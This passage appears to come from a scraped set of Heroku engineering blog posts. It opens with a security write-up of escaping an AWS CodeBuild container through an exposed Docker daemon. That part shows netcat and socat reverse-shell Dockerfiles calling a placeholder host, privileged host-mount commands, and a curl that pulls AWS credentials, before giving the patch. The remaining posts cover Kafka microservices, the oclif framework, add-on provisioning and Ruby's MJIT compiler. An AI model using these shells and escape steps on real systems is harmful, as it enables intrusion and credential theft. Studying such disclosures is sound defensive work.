following Dockerfile could be supplied to the build system, allowing us to gain interactive access to the container being built. This simply allows for speedier exploration, rather than waiting for the build process to complete each time; FROM alpine:latest\n\nRUN apk add --update --no-cache netcat-openbsd docker\nRUN mkdir /files\nCOPY * /files/\nRUN mknod /tmp/back p\nRUN /bin/sh 0</tmp/back | nc x.x.x.x 4445 1>/tmp/back Yes, the reverse shell could be done in a bunch of different ways . This Dockerfile installs a few dependencies, namely docker and netcat . It then copies the files in our source code directory into the build container. This will be needed in a later step and also makes it easier to quickly transfer our full exploit to the system. The mknod instruction creates a filesystem node that allows for redirection of stdin and stdout through the file. A reverse shell is opened using netcat . We also need to setup a listener for this reverse shell on an system we control with a public IP address. nc -lv 4445 Now when the build happens, a reverse connection will be received: [ec2-user@ip-172-31-18-217 ~]$ nc -lv 4445\nConnection from 34.228.4.217 port 4445 [tcp/upnotifyp] accepted\n\nls\nbin\ndev\netc\nfiles\nhome\nlib\nmedia\nmnt\nproc\nroot Now with remote, interactive, access, we could check if the Docker daemon could be accessed: docker -H 172.18.0.1 version We specify the remote host by using -H 172.18.0.1 . This address was used since we have discovered that the network range being used by Docker is 172.18.0.0/16 . To find this, our interactive shell is used to do a ip addr and ip route to get the network assigned to our build container. Remember that all Docker containers get put into the same network by default. The default gateway would be the instance that the Docker daemon is running on. Client:\nVersion:      17.05.0-ce\nAPI version:  1.29\nGo version:   go1.8.1\nGit commit:   v17.05.0-ce\nBuilt:        Tue May 16 10:10:15 2017\nOS/Arch:      linux/amd64\n\nServer:\nVersion:      17.09.0-ce\nAPI version:  1.32 (minimum version 1.12)\nGo version:   go1.8.3\nGit commit:   afdb6d4\nBuilt:        Tue Sep 26 22:40:56 2017\nOS/Arch:      linux/amd64\nExperimental: false Success! At this point we have access to Docker from within the container being built. The next step is to start up a new container with additional privileges. Stack Them We have a shell, but it is in the throw-away build container - not very helpful. We also have access to the Docker daemon. How about combining the two? For this, we introduce a second Dockerfile, which when built and run will create a reverse shell. We start up a second listener to catch the new shell. FROM alpine:latest\n\nRUN apk add --update --no-cache bash socat\nCMD socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:x.x.x.x:4446 This is saved as Dockerfile2 in the source-code directory. Now when the source-code files are copied into the build container, we can access it directly. When we re-run the build process, we would get our first reverse shell on port 4445 , which leaves us in the build container. Now we can build Dockerfile2, which was copied into our build container with COPY * /files/ ; cd files\ndocker -H 172.18.0.1 build -f Dockerfile2 -t pew . A new Docker image is now built using the host Docker daemon and is available. We simply need to run it. Here there is an additional trick needed, we need to map through the root directory into the new Docker container. This can be done with -v /:/vhost . In our first reverse shell: docker -H 172.18.0.1 run -d --privileged --net=host -v /:/vhost pew A new reverse shell will now connect to port 4446 on our attacker system. This drops us into a shell in a new container with direct access to the underlying CodeBuild host's filesystem and network. This is because the --net=host will map through the host network instead of keeping the container in an isolated network. Secondly, because the Docker daemon is running on the host system, when the file mapping with -v /:/vhost is done, the host system's filesystem is mapped through. In the new reverse shell, it's now possible to explore the underlying host filesystem. We could prove we are outside of Docker when interacting with this filesystem, by checking the difference between /etc/passwd and /vhost/etc/passwd . Inside /vhost we also found that there was a new directory, which clearly indicates we are inside the CodeBuild instances filesystem and not just any Docker container; 243e490ebd3:/# cd /vhost/\n3243e490ebd3:/vhost# ls\nbin        dev        lib        mnt        root       srv        usr\nboot       etc        lib64      opt        run        sys        var\ncodebuild  home       media      proc       sbin       tmp The magic happens inside codebuild . This is what AWS Codebuild uses to control the build environment. A quick look around reveals some interesting data. 3243e490ebd3:/vhost/codebuild# cat output/tmp/env.sh\nexport AWS_CONTAINER_CREDENTIALS_RELATIVE_URI='/v2/credentials/e13864de-c2aa-44ab-be11-59137341289d'\nexport AWS_DEFAULT_REGION='us-east-1'\nexport AWS_REGION='us-east-1'\nexport BUILD_ENQUEUED_AT='2017-11-20T15:06:37Z'\nexport CODEBUILD_AUTH_TOKEN='11111111-2222-3333-4444-555555555555'\nexport CODEBUILD_BMR_URL='https://CODEBUILD_AGENT:3000'\nexport CODEBUILD_BUILD_ARN='arn:aws:codebuild:us-east-1:00112233445566:user:11111111-2222-3333-4444-555555555555'\nexport CODEBUILD_BUILD_ID='111111:11111111-2222-3333-4444-555555555555'\nexport CODEBUILD_BUILD_IMAGE='codebuild/image'\nexport CODEBUILD_BUILD_SUCCEEDING='1'\nexport CODEBUILD_GOPATH='/codebuild/output/src794734460'\nexport CODEBUILD_INITIATOR='api-client-production'\nexport CODEBUILD_KMS_KEY_ID='arn:aws:kms:us-east-1:112233445566:alias/aws/s3'\nexport CODEBUILD_LAST_EXIT='0'\nexport CODEBUILD_LOG_PATH='0ff0b448-6bed-4af1-8be5-539233fa2e9e'\nexport CODEBUILD_SOURCE_REPO_URL='builder/builder-source.zip'\nexport CODEBUILD_SRC_DIR='/codebuild/output/src794734460/src/builder-source.zip'\nexport DIND_COMMIT='3b5fac462d21ca164b3778647420016315289034'\nexport DOCKER_VERSION='17.09.0~ce-0~ubuntu'\nexport GOPATH='/codebuild/output/src794734460'\nexport HOME='/root'\nexport HOSTNAME='3243e490ebd3'\n... At this point, we would usually try and extract AWS credentials and pivot. To do this here we need to use the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI curl -i http://169.254.170.2/v2/credentials/e13864de-c2aa-44ab-be11-59137341289d\n\n{\"RoleArn\":\"AQIC...\",\n\"AccessKeyId\":\"ASIA....\",\n\"SecretAccessKey\":\"uVNs32...\",\n\"Token\":\"AgoGb3JpZ2luEJP...\",\n\"Expiration\":\"2017-11-20T16:06:50Z\"} Depending on the permissions associated with that IAM, there should now be the opportunity to move around the AWS environment. The above steps could be automated and done with only one reverse shell, however, remember that you need to keep the build environment alive . Having a reverse shell in here does that, but a long-running process should also do the trick. The main thing is you don't want the initial docker build to complete, as this will initiate the tear-down of your build environment. Also, note most build environments tend to give you 30-60min before they are automatically torn down. Patching The fix, in this case, is extremely simple, never bind the Docker daemon on all interfaces. Removing the line --host=tcp://0.0.0.0:2375 from the wrapper script takes care of this. There is no need to bind to a TCP port, since the unix socket is already being mapped through with --host=unix:///var/run/docker.sock . Conclusion Containers offer a great mechanism for creating secured environments in which to run untrusted code, without requiring additional virtualization. These containers are however only as secure as their configuration. They are pretty secure by default, but a single misconfiguration is all it takes to bring down the whole pile of cards. Build environments offer an interesting architectural challenge and you'll always need to think in terms of security layers. security Docker CI", "date": "2018-03-08,"},
{"website": "Heroku", "title": "SHIFT Commerce's Journey: Deconstructing Monolithic Applications into Services", "author": ["Ryan Townsend"], "link": "https://blog.heroku.com/monolithic-applications-into-services", "abstract": "SHIFT Commerce's Journey: Deconstructing Monolithic Applications into Services Posted by Ryan Townsend March 13, 2018 Listen to this article Editor’s Note: One of the joys of building Heroku is hearing about the exciting applications our customers are crafting. SHIFT Commerce - a platform helping retailers optimize their e-commerce strategy - is a proud and active user of Heroku in building its technology stack. Today, we’re clearing the stage for Ryan Townsend, CTO of SHIFT , as he provides an overview of SHIFT’s journey into building microservices architecture with the support of Apache Kafka on Heroku. Software architecture has been a continual debate since software first came into existence. The latest iteration of this long-running discussion is between monoliths and microservices – large self-contained applications vs multiple smaller applications integrated together – but an even bigger question lies under the surface of our architecture philosophy: why does this even matter? While the architectural choices we make may be hidden away from end-users, they ultimately are affected. Impact can be seen not only in the performance, scalability and reliability of user-facing applications, but also in a much deeper effect on the future of our businesses – the ability to innovate depends on developer productivity, availability of resources, and governance/process overhead. And although there’s no silver-bullet to getting your architecture ‘right’ (sorry!), there is ‘right’ for your business - and that ‘right’ will evolve over time as the company and its needs change. It’s critical we continually ask ourselves: are we doing the right thing? Otherwise, before we know it, our competition is advancing ahead of us. With the “why” in mind, I’d like to talk a bit more about some of the differences we’ve considered while building our architecture here at SHIFT. Are Monoliths Such A Bad Thing? Before we even start to consider whether we should be breaking-down a monolith, we should start with identifying what problems we are trying to solve and not just jump into ripping up the floorboards without an understanding of what a better architecture - perhaps enabled through microservices - actually looks like for you. There are two aspects of inefficient architecture that are unfairly blamed on monoliths: poorly structured code; and poor scalability. In reality, you absolutely can have a well-factored, maintainable monolithic codebase – Basecamp are a proponent of this - and if we take an honest look at the scale of our applications, very few of us are pushing the boundaries of optimisation or infrastructure. Bad software architecture isn’t a problem that will magically be solved with microservices; this just shifts the problem from one poorly-structured codebase to many. And as renowned developer Simon Brown astutely states: “If you can’t build a well-structured monolith, what makes you think microservices is the answer?” Why Should We Consider Microservices? Alright, time for some positivity – there are some really great reasons to move to microservices. While we mentioned a few areas that can be false flags for moving away from monolith architecture, if you’re encountering any of these issues - now or in the future - microservices may be for you: 1. Communication Overhead is Hampering Productivity. Even with the utmost care when companies grow, communication can become an ever-increasing drain on productive development time. If you carve out a whole self-contained area of functionality, you can give teams autonomy and reduce communication/organizational overhead! We did this with our Order Management Suite, an area with enough complexity and breadth of features to keep a team busy! 2. Overbearing  Governance and High-Risk Deployments Monoliths lump mission-critical features with completely negligible ones. Given SHIFT operates an enterprise-scale platform, we have to manage certain areas very carefully, but we don’t want to allow that to hamper our agility in others. An example of this is our admin panel, for which outages (planned or otherwise) or bugs have far less severe impact than if carts stopped working on our client’s websites! 3. Language or Infrastructure Limitations You can probably squeeze out far more scalability from monoliths than you’d expect, and it’s really important you validate you’re not just moving a cost from infrastructure to your expensive development and support engineering teams, but there are times when using other technologies simply makes more sense, for example Node.js or Go are going to be more efficient for slow request handling than Ruby. At SHIFT, we extracted our integration system, which was making a lot of varied calls, to external HTTP services. Using Node.js for this left Ruby to deal with a more consistent pattern of requests. What’s the Glue? No matter how you slice your application, a common principle to succeed with microservices is keeping the resulting applications decoupled from one another. Otherwise, you’re bound to face a litany of downsides. Some see the irony - or humor - in this outcome: We replaced our monolith with micro services so that every outage could be more like a murder mystery. — Honest Status Page (@honest_update) October 7, 2015 Requiring real-time, consistent access to functionality or data managed by another service is a recipe for disaster – so we look for clean lines of segregation and pass the rest of the data around asynchronously.  This avoids the indirection of one service calling another, that calls another, and so on. This begs the question: what should live in the middle and help services communicate? There are a variety of message brokers you could use, such as ActiveMQ and RabbitMQ, but SHIFT chose a managed Apache Kafka service for the following reasons: Messages are ordered chronologically and delivery is guaranteed. We wanted all services to have an accurate picture of the system at large. Durability, resilience and performance are all incredibly strong. We’re responsible for an enterprise system, it’s paramount we avoid outages, data loss or any form of service degradation. Heroku have removed the operational pain. We believe in doing what we’re good at and relying on the expertise of others, where suitable, to keep us lean and agile. Apache Kafka describes itself as a “distributed commit log” or an “event-stream”, you can think of it as a list of chronological events broken up into multiple streams, known as “topics”. Your applications can connect into one or more topics, publish new events and/or consume the events sequentially. These events could be simple notifications of actions or they could carry state changes, allowing each service to maintain its own dataset. There are a whole bunch of other benefits to using an event stream (like Kafka) that Heroku Developer Advocate, Chris Castle , and I covered in our talk at Dreamforce 2017 – check out the recording here. What Are Our Steps to Migrating to Kafka-driven Services? The “big rewrite” is well-known to be something to be avoided if at all possible, so ultimately we need something far less risky. We arrived at a process for extracting services progressively. This even allows evaluation of whether microservices are the right choice before fully committing because we don’t remove the existing implementation or send production traffic until the final steps. These are our eight steps: Step 1: Add Producer Logic to the Monolith It might surprise you but step 1 is actually adding more code to our monolith! You’ll typically need access to data in your new service, so the first step is to push that into Kafka via a Kafka producer within the monolith. Step 2: Consume the Stream into the Database Before we start extracting logic, we’re going to prepare our data store, this will keep our service decoupled from the rest of our ecosystem. This new service is simply going to contain a consumer and the data store initially, allowing local access to state. Depending on your application you may need to backfill the historical data by performing a data migration. Step 3: Test the Consumer Validate that your new service is processing the events without errors, and the consumer isn’t getting too far behind on the event stream. Kafka is designed to handle the consumers getting behind for a period of time – it persists events for a period of time (2-6 weeks on Heroku), so you don’t need to worry about data loss, but it will mean your service has an out-of-date view of the data. Kafka’s ability to act as a buffer when your system is under high-load is one of it’s great features, so it’s worthwhile understanding and preparing for scenarios where your consumers get behind. Step 4: Replicate Your Logic Extract the relevant code from your monolith into the above new application. Test that it works in isolation, by manually executing procedures / API calls. It should be reading from the new data store, without processing any production API calls. Be wary of functionality that could trigger emails or have other unintended side-effects – you may need to disable some external calls. Step 5: Add, Test, and Consume Event Triggers Add a feature toggle to your monolith which will only send actionable events to the new service for a subset of accounts (obviously this will depend on how your application works, it could be based on users/teams/companies) and implement producers for these events. You can check these are working by tailing Kafka and ensuring the events you expect are flowing through. Once you’re happy, add consumers to your service which will process these events, executing the relevant procedures within the service. Step 6: Push Events Back You may need to communicate back to the monolith, so you’ll need producers in your service and consumers in your monolith to handle this. Step 7: Test Action Events Activate the feature toggle for a test account, and test that the application continues to operate as normal. Step 8: Remove Deprecated Logic From Monolith Over time, ramp-up the feature toggle to be enabled for more and more accounts., Once all accounts are using the new service, we can remove the feature toggle altogether and make it the default code path. Finally, we can remove the extracted logic from the monolith. This may have taken a while, but it’s been achieved safely. Where are SHIFT Today? We are still on our journey and I expect we’ll have a couple more services extracted this year, but through careful extraction of just a few services, SHIFT are already achieving: More regular releases; Lower latency on I/O restricted API calls; and Prevention of user-facing outages. My advice to anyone getting started would be to very wary of why you’re considering microservices, don’t just be drawn purely for the shiny technology, be drawn because you have a genuine problem to solve. That said, I recommend trying out Kafka to develop a deeper understanding of what problems it can solve for you. I’d definitely check out the multi-tenant Kafka plans on Heroku - they start from $100/mo, so for the cost of a daily coffee, you can explore the technology with a side project. microservices monolith architecture kafka", "date": "2018-03-13,"},
{"website": "Heroku", "title": "Open Sourcing oclif, the CLI Framework that Powers Our CLIs", "author": ["Nahid Samsami"], "link": "https://blog.heroku.com/open-cli-framework", "abstract": "Open Sourcing oclif, the CLI Framework that Powers Our CLIs Posted by Nahid Samsami March 20, 2018 Listen to this article Today we're excited to announce that we've open sourced oclif , a framework for building command line interfaces. We built oclif to serve as the common foundation for both the Heroku and Salesforce CLIs and to abstract away the common struggles.  The framework is now available to any developer for building CLIs large or small. oclif makes building CLIs more accessible by providing you with the patterns and tools to scaffold a working command line interface. It provides a structure for simple to advanced CLIs, including documentation, testing, and plugins for adding new commands. With oclif you can get up and running with your command line interface quickly, and focus on the implementation of the commands themselves. oclif is a Foundation for Your CLI oclif distills our expertise from years of building and maintaining CLIs used by millions of developers. It provides the performance that large codebases require and the simplicity that makes it easy to build small CLI's. Features include: CLI Generator — Quickly scaffold out a new CLI and new commands Documentation — In-CLI documentation with --help and markdown documentation is automatically generated Plugins — Allow CLI users to extend your CLI with new functionality And more Why Build a CLI? A well-designed command line gives its users power and productivity. There are lots of use cases where you might want to build a command line interface: To provide a simple interface for users to interact with your API As a platform to share commonly-used scripts at your company To prototype a feature quickly without needing to build a web interface To perform bulk tasks, such as adding a large number of users or details to an account Designed for Delightful CLI Experiences We believe CLIs should be designed primarily for human readability and usability, while at the same time supporting advanced users and output formats. For example, input and output should be consistent across commands to allow the user to easily learn how to interact with new commands. oclif follows the usability principles in our CLI Style Guide , which provides direction on designing a delightful CLI experience. Getting Started Creating a Single CLI (with just one command) can be done in less than 3 minutes! The requirements are Node, npm and yarn. Try our getting started tutorial to get up and running right away. oclif Example Project: kaomoji The Heroku and Salesforce CLI projects are large and complex, so we built a small example CLI from the ground up to test out oclif and give you an idea of what is possible with oclif on a smaller scale. Hello kaomoji ! Have you ever struggled to find the appropriate emoji for your conversation? In this example we'll create a CLI, built on oclif, that enables you to search for an ASCII kaomoji (Japanese style emoticons) in your command line interface. To get started Generate scaffold - run npx oclif single <your cli name, e.g. kaomoji> , 'single' here denotes a single-command CLI. Read more about what that means in the oclif docs . Add metadata - answer the questions to describe your CLI and where it lives in GitHub Hello world! - your scaffold is up and running Customize - edit the generated index.ts TypeScript class to add your CLI logic, e.g. search a kaomoji dictionary based on a keyword and return the kaomoji (note: you don't have to use TypeScript, but it's encouraged) It's working - run ./bin/run to test your CLI   ᕕ( ᐛ )ᕗ Learn More You can learn more about oclif on its dedicated community site , which includes detailed documentation, example projects, and links to sample code. We also discuss the development of oclif in more depth in the Salesforce engineering blog . We'd love to hear your feedback as you develop on oclif and welcome your contributions. We even have a few Github issues that would be great for first-time contributors. We'd also love to include more examples of CLI's built with oclif on our site. Please drop us a line at ecosystem-feedback@heroku.com or join the conversation in Gitter . CLI oclif framework open source", "date": "2018-03-20,"},
{"website": "Heroku", "title": "Updated Async Provisioning of Add-ons", "author": ["Arif Gursel"], "link": "https://blog.heroku.com/updated-async-provisioning-of-add-ons", "abstract": "Updated Async Provisioning of Add-ons Posted by Arif Gursel March 21, 2018 Listen to this article Asynchronous provisioning allows add-ons to perform out-of-band provisioning in a first-class way. It’s intended for add-on services that need extended time to set up and help make automated app setup and orchestration easier and less error-prone. The customer will be billed as soon as the add-on starts provisioning. This means the time and cost of provisioning your service is accounted for in how much a customer pays. As such, you should make every effort to provision expediently so customers get value from your service as quickly as possible. Add-ons that take longer than 12 hours to provision (or those your service fails to mark as “provisioned” via the API in that time period) will be considered failed and removed from the user’s app. The customer will not be charged in this case and no money will be passed on to the Partner. Previously, we needed to manually flag partners into async provisioning. Going forward, all add-on services will flagged into async provisioning by default. With this change, we will stop supporting 202 HTTP status responses for add-ons that do not support async workflow. In lieu of 202 responses, an update to 200 HTTP status responses are required if your add-on integration isn’t set up for async provisioning. If your add-on continues to respond with 202 and does not support async provisioning, all add-on provisions will be deleted after the timeout is exceeded. Check out the Asynchronous Provisioning of Add-ons documentation for more details on how to implement async workflow for your add-on. addons partners integration api async asynchronous provisioning", "date": "2018-03-21,"},
{"website": "Heroku", "title": "MJIT: A Method Based Just-in-time Compiler for Ruby", "author": ["Jonan Scheffler"], "link": "https://blog.heroku.com/ruby-mjit", "abstract": "MJIT: A Method Based Just-in-time Compiler for Ruby Posted by Jonan Scheffler April 12, 2018 Listen to this article I sat down with some Ruby friends in Hiroshima last year to have a conversation about just-in-time compilation for Ruby, specifically the new MJIT method-based implementation. Those of you who are already familiar with JITs and how they work might want to skip directly to the interview , the rest of us are going to hang out for a minute and learn about how things presently work in Ruby, and what it is exactly that the MJIT would change. How does a Ruby program run? Computers don’t speak Ruby or any other high-level language, they only speak machine language. In a compiled language like C++ you use a compiler to convert all of your C++ code into machine language directly before you run your program. When you’re using an interpreted language like Ruby, your code is compiled into some other intermediary language, which is then run by the language virtual machine (VM). You can think of these language-specific VMs as computers that have learned another, slightly more complicated language. The creators of the language built a new, easier to use language, and then built another computer, the VM, which is capable of running those instructions directly, because it already includes machine language for all possible VM instructions. These languages are known as intermediate representations (IRs). In the specific case of Ruby, the intermediate representation is written with YARV instructions. YARV: Yet Another Ruby VM YARV is a stack-oriented virtual machine written by Koichi Sasada and merged into Ruby back in 2007, for version 1.9. Ruby code is interpreted into YARV instructions, and the Ruby VM is able to run those instructions directly, because every VM instruction has already been translated into machine language, and those bits of translation code are included in the VM. Stack-oriented? A stack-oriented VM architecture , as opposed to a register-oriented architecture, uses a Last-In-First-Out (LIFO) stack to store operands. Operations are handled by popping data off of the stack, processing them, and pushing back the result. It can be difficult to reason about something so abstract, so let’s start with some example code and take a look at how Ruby would turn that code into a YARV instruction sequence. 18 + 24 So we have our code, how do we get the YARV instructions? Thankfully Ruby as a language makes introspection fairly easy. We can use a RubyVM::InstructionSequence to compile our Ruby code in an IRB console and see the resulting YARV instructions. The code below compiles our Ruby program into an instruction sequence and then disassembles it into human readable instructions: $> puts RubyVM::InstructionSequence.compile(\"18 + 24\").disasm\n== disasm: <RubyVM::InstructionSequence:<compiled>@<compiled>>==========\n0000 trace            1                                               (   1)\n0002 putobject        18\n0004 putobject        24\n0006 opt_plus         <callinfo!mid:+, argc:1, ARGS_SIMPLE>\n0008 leave\n=> nil We can ignore the trace and leave instructions for our example, so these are the relevant lines of code: putobject        18\nputobject        24\nopt_plus These instructions tell the Ruby interpreter how to calculate our result. The first putobject tells the interpreter to put 18 on the stack, the next one will then put 24 on the stack and finally we see an opt_plus instruction, telling the interpreter to add the previous two objects together. This stack-oriented architecture is a very common way to build virtual machines; the JVM is another popular example of a stack-oriented VM. The alternative to a stack-oriented architecture is called a register-oriented architecture, and it takes an entirely different approach. Register-Oriented Virtual Machine Architecture CPUs include a small number of onboard memory locations called registers . They’re the fastest storage locations available to a CPU as they are physically closest to the execution engines. Accessing data from a register is 2 or 3 times faster than accessing it from the next closest storage location, the L1 cache , which takes about half a nanosecond; orders of magnitude faster than going out to RAM. In order to take advantage of faster access times, the developers of GCC and similar compilers are able to assign commonly accessed data to registers. In a register-oriented architecture, the compiled instructions then reference the data in the CPU registers directly. This is an example of what our previous code might look like using a register-oriented architecture: plus <operand 1 address> <operand 2 address> <result address> The instruction above starts with the operation “plus” and supplies memory addresses for our two operands (18 and 24), along with an address to store the result. We’re able to accomplish what we did previously with a single instruction, instead of the 3 instructions required with a stack-based architecture. While we generate fewer instructions with this approach they are individually longer than the stack-based instructions; in certain circumstances this could lengthen the compilation step, as the longer instructions increase decoding overhead and take up more space in memory, decreasing data locality. Keeping data close together in memory has significant advantages, as modern processors are better able to make use of caching to accelerate compilation. Even though the individual instructions may compile more quickly using a stack-oriented IR, there will be more of them, which is in part why a register-oriented IR will be faster in most cases. Compiler Optimizations An important benefit of using a register-oriented architecture is that an optimizing compiler such as GCC is able to more effectively optimize those instructions, as these compilers are designed to work with register-based IRs. During compilation GCC makes additional passes over your instructions once they make it to an intermediate representation, so the CPU will be able to execute your instructions more quickly. A good example of one of these optimization steps is the mode switching optimization. Modern processors operate in a number of distinct modes that place restrictions on the types of operations that can be performed, so any given operation requires that the processor be in the correct mode to execute that instruction. The CPU can change modes while executing our compiled program, but it accrues overhead every time it’s required to change modes. GCC optimizes instructions to minimize the number of mode changes, by grouping and rearranging instructions that are able to be executed in the same mode. Internally GCC uses an IR called Register Transfer Language (RTL), and after converting your instructions to RTL, GCC will perform more than 20 different optimization passes that take advantage of opportunities like CPU mode switching to speed up your compiled code. Vlad and RTL If you weren’t paying close attention to Ruby’s progress over the last year, you may not yet have heard of Vladimir Makarov. Vladimir is a developer at RedHat working in the tools group, primarily focusing on register allocation for GCC; the process by which a compiler determines which variables in a bit of code will end up stored in CPU registers during compilation. At RubyKaigi in September of last year Vladimir detailed some of the work he’d been doing with MJIT in his presentation Towards Ruby 3x3 Performance . As a part of that work Vlad created an IR for Ruby named RTL, named after the GCC IR that it closely resembles. While the name is the same, the RTL that Vlad proposed for Ruby is distinct from the representation GCC uses internally. The RTL Vlad has created is generated by the existing Ruby interpreter, Matz's Ruby Interpreter (MRI) , where it would have previously generated YARV instructions. Speculative Optimizations Using Vlad’s RTL generator allows MRI to make speculative optimizations on your Ruby code; it can make assumptions about the operands that generate operand specific RTL instructions. As an example, if a method is run the first several times with only integer operands, MRI can replace the plus instruction from the RTL with an integer-specific version iplus . This iplus instruction will run faster than a universal plus instruction. If the instruction is later surprised to find it’s been given float operands, the RTL will revert back to the universal plus instruction, and it won’t attempt to speculate on that portion of code again. These operand specific RTL instructions can later be converted into C code that runs faster than its universal counterpart once that C is compiled. The generation and compilation of the C code in Vlad’s proposal is accomplished by a just-in-time compiler named MJIT. MJIT During his RubyKaigi presentation Vlad proposed that Ruby merge a just-in-time compiler called MJIT that uses GCC, so named because it’s a method-based JIT: a JIT that optimizes hot code paths using a method as the smallest optimization target. A method-based JIT will recognize when a method is being called repeatedly and optimize that path. In Vlad’s proposed MJIT that optimization generates C code. Vlad’s vision for Ruby is one where MRI converts Ruby code into RTL (the RTL Vlad wrote for Ruby, NOT the version in GCC), which is then converted by MJIT into C code to be compiled by GCC. GCC compiles the C code into a C shared object file (an “.so” file), which is linked to MRI. The end result of this entire process is that MRI is able to use the C code that MJIT already compiled the next time that method is called, significantly speeding up execution. While Vlad’s proposal does speed up Ruby, it does so with some pretty hefty changes to MRI itself. This is perceived by some as an introduction of risk, primarily because it increases the surface area of the feature. In the time since RubyKaigi an alternative JIT implementation was developed to address these concerns, one that generates C code from the existing YARV instructions, omitting Vlad’s RTL changes to MRI. This JIT implementation by Takashi Kokubun [k0kubun] is known as YARV-MJIT and it was merged in Ruby 2.6. YARV-MJIT Takashi Kokubun’s YARV-MJIT compiler uses some of the JIT infrastructure introduced from Vlad’s proposed MJIT, but it was otherwise largely developed in parallel. Kokubun’s JIT increases the speed of many Ruby programs, but for the time-being Rails applications do not seem to enjoy that benefit. For this reason, among others, the JIT is not enabled by default in Ruby 2.6. If you’d like to play with it you can enable it with the --jit flag: ruby --jit your_program.rb In his pull request Kokubun shows the results of an optcarrot benchmark indicating a speed increase of about 27%. In a completely unscientific experiment where I paid no attention to the other work my Macbook was doing (3.5 GHz Intel Core i7, 16 GB 2133 MHz LPDDR3) I was able to get about 16% running locally: > ruby -v -Ilib -r./tools/shim bin/optcarrot --benchmark examples/Lan_Master.nes\nfps: 34.79269354352727 > ruby --jit -v -Ilib -r./tools/shim bin/optcarrot --benchmark examples/Lan_Master.nes\nfps: 41.55450796571314 While Kokubun’s JIT implementation clearly has some room for growth, especially for Rails, it seems likely to significantly accelerate progress towards the Ruby team’s 3x3 goal. The Interview Jonan: We've just finished RubyKaigi 2017 , and I'm sitting here with Matz ( Yukihiro Matsumoto ) and our friend Vlad ( Vladimir Makarov ). We also have Aaron Patterson, sometimes known as Tenderlove , and Koichi Sasada with us today. We're sitting down to talk about implementing a JIT for Ruby, and specifically how that's going to impact progress for Ruby 3x3 ; the announced plan for Ruby 3.0 to be three times faster than 2.0. So by perfect chance, we've discovered Vlad, a very helpful man who has been working on GCC for about 20 years. Vlad popped into the community about two years ago and started contributing in a way that makes it very likely that we will achieve our 3x3 goal, I think, but I'm curious to hear what you all think, because I am not a committer, and it's not up to me. Matz, do you think that we're going to make our 3x3 goal? Matz: I really, really hope so, and Vlad's work looks pretty promising. We set some criteria for Ruby 3x3, one of which is that we don't want use an existing JIT library; LLVM or something like that, because we don't control those things. Their API might change, or the project may be abandoned. Another criteria for the 3x3 project was to be as portable as possible, which is kinda difficult. You know, the other languages like, say, Crystal or Julia are using LLVM, but we cannot use that kind of thing if we want portability. The Ruby language itself is a pretty long-running project. Ruby itself is 25 years old, we can't rely on comparatively short-lived projects. Jonan: Some of the other solutions, like LLRB , show how you could do what Evan Phoenix proposed a couple years ago , using LLVM to accomplish just-in-time compilation. Do you think that projects like that are unlikely to succeed for Ruby because we need to preserve the portability of the language? Do you think maybe something closer to Vlad's approach is likely to get merged instead of another approach? Matz: Yes, that's my opinion. Jonan: What do you think, Koichi? Koichi: I like this approach, as Matz says, it's portable and it doesn't require us to use additional software we can't control. We tried to write a Ruby to C translator ( Ruby2c , a project by Ryan Davis and Eric Hodel ), but it didn't work out on paper, so we stopped. I'm very happy to see such a practical use case. Now Vlad is working on a product-ready JIT compiler. I'm very happy to see such great software. Jonan: So Vlad, I was surprised to see so much progress so quickly after your recent hash changes . You're spending about half of your time on Ruby right now, correct? Vlad: That's right. I still need to maintain a lot of very complicated code in GCC's register allocator. I'm in maintenance mode right now, so I don't develop new optimizations for the register allocator. I have an agreement with my manager that allows me to work on Ruby. Our tools group focuses on static languages, not on dynamic languages. That's another department in Red Hat. Jonan: So your manager at RedHat is kind enough to give you the opportunity to work on projects that you find interesting. You were talking a little bit earlier about how you chose Ruby. Could you recap that for us? Vlad: As I said earlier, when you work for a long time on the same project, it becomes a bit boring. Much of MRI is 25 years old. GCC, this year, is 30 years old, and I actually started to work on GCC in 1989, but not professionally. It was version 1.42. It's boring, so I started to look at different languages, different implementations. Red Hat has some priorities for languages, and unfortunately, Ruby is not a high-priority language. The highest priority languages right now are Javascript and .NET, because Microsoft pays a lot of money to Red Hat for .NET. Also Python, of course, because it's used in Unix distribution in many places. That being said Ruby is still important. After looking at the source for all of these languages, I like the Ruby code the most. I don't like Python code. I don't like Javascript or the different implementations. The MRI code is close to GCC code. Koichi: Yeah, he chose Ruby mostly for the code. Jonan: The code by Koichi resembles the code you've worked with in GCC? It's the style of C that you prefer? Vlad: That's true. Actually, someone asked me at this conference why I chose MRI, because C code is horrible. Koichi: It is horrible, yeah. Vlad: But I told him it's quite the opposite. The code is very good, so that's why I like it. Jonan: Let's talk about your current implementation. I understand it's quite early in the MJIT project. MJIT is what it's called, right? Vlad: Yes, Method JIT. Jonan: It's been about six months that you've been working on this. Vlad: No, it's about a year. I started last summer. I've been working on RTL and MJIT because it's a related project. Jonan: Aaron, could you explain what makes this is a Method JIT specifically? Aaron: It's only JITing methods. So basically what it does is it just says, \"Okay, I'm gonna take a method and convert it into whatever, in this case, C code. I'll compile it, and then use that.\" Matz: In contrast to a Tracing JIT; there are two kinds of JIT. One is the Method JIT, the other is the Tracing JIT. So a Tracing JIT traces the execution path inside of the method, and those sometimes go away, so you compile these things into machine language at runtime. A Method JIT uses the method as a unit of compilation. Aaron: It could include method calls or whatever, but it's actually recording the path through the code that gets executed and using that as a way to determine what to JIT. In a Method JIT, the method is the unit that gets compiled. Vlad: The Method JIT is a superior JIT, but it's harder to implement. It's easier to optimize linear code, and therefore more popular, because you need fewer parts to implement optimization on linear code. Matz: Yeah, that's the reason some JIT compilers are switching from a Tracing JIT to a Method JIT. For example, the JIT team at Firefox just abandoned a Tracing JIT and are moving toward a Method JIT . Jonan: So a Method JIT is a strictly superior method of accomplishing this? Matz: Yes. Sometimes a Tracing JIT is faster, but it consumes more memory, and sometimes it is more difficult to optimize. Jonan: So the downside in using a Method JIT is just the complexity. Koichi, do you feel like a Method JIT is the way to go? Koichi: Yeah, it is much simpler, so I think it is good to try. Peak performance for a Tracing JIT is with something like an inner loop; it will be one instruction and it will be high performance. There are only a few places to get such peak performance with Ruby, so I think a Method JIT is better. For example, in a Ruby on Rails application, we don't have a single hot spot, so a Method JIT is more straightforward. Jonan: I see, so this is a better approach for Ruby and hopefully for Rails as well. One of your goals with this particular implementation of the Method JIT is simplicity; your goal is not necessarily to have the fastest JIT, but to have the easiest-to-understand JIT. Vlad: Yeah, because we have no resources. I mean that the Ruby community doesn't 